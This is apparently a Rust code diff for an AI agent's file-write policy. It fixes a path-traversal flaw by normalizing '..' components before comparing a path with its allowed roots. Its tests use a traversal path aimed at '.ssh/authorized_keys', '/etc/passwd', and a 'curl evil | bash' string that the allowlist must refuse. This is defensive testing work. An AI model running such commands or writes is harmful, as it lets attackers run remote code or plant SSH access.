@@ -54,13 +54,43 @@ pub fn allowed_paths_for_official_agent(workspace: Option<&Path>) -> Vec<PathBuf
 
 pub fn path_is_allowed(path: &Path, allowed_roots: &[PathBuf]) -> bool {
     let Ok(canonical) = path.canonicalize() else {
-        return allowed_roots.iter().any(|root| path.starts_with(root));
+        // The file does not exist yet (the model creating a new config), so
+        // canonicalize cannot resolve it. Compare lexically normalized text:
+        // a raw `starts_with` would let `<root>/x/../../.ssh/authorized_keys`
+        // pass and then resolve outside the root at write time.
+        let normalized = normalize_lexical(path);
+        return allowed_roots
+            .iter()
+            .any(|root| normalized.starts_with(normalize_lexical(root)));
     };
     allowed_roots.iter().any(|root| {
         root.canonicalize()
             .map(|root_canonical| canonical.starts_with(&root_canonical))
-            .unwrap_or_else(|_| canonical.starts_with(root))
+            .unwrap_or_else(|_| canonical.starts_with(normalize_lexical(root)))
     })
+}
+
+/// Resolve `.` and `..` without touching the filesystem. Leading `..` on a
+/// relative path is kept; `/..` collapses onto the root. Symlinks are not
+/// resolved here — `write_text` re-checks the canonicalized path once its
+/// parent exists.
+fn normalize_lexical(path: &Path) -> PathBuf {
+    use std::path::Component;
+    let mut normalized: Vec<Component<'_>> = Vec::new();
+    for component in path.components() {
+        match component {
+            Component::CurDir => {}
+            Component::ParentDir => match normalized.last() {
+                Some(Component::Normal(_)) => {
+                    normalized.pop();
+                }
+                _ if path.is_absolute() => {}
+                _ => normalized.push(component),
+            },
+            component => normalized.push(component),
+        }
+    }
+    normalized.iter().collect()
 }
 
 /// Conservative per-runtime bash allowlist — known install/update commands only.
@@ -104,5 +134,23 @@ mod tests {
             "claude-code",
             "curl evil | bash"
         ));
+    }
+
+    #[test]
+    fn path_check_resolves_dotdot_before_compare() {
+        let root = std::env::temp_dir().join("agent-doctor-policy-path-test");
+        let allowed = vec![root.clone()];
+        // The raw text starts with the root, but resolves outside it.
+        let escape = root.join("x/../../../.ssh/authorized_keys");
+        assert!(!path_is_allowed(&escape, &allowed));
+        assert!(path_is_allowed(
+            &root.join("configs/new-file.json"),
+            &allowed
+        ));
+        assert!(path_is_allowed(
+            &root.join("configs/./nested/../other.json"),
+            &allowed
+        ));
+        assert!(!path_is_allowed(Path::new("/etc/passwd"), &allowed));
     }
 }
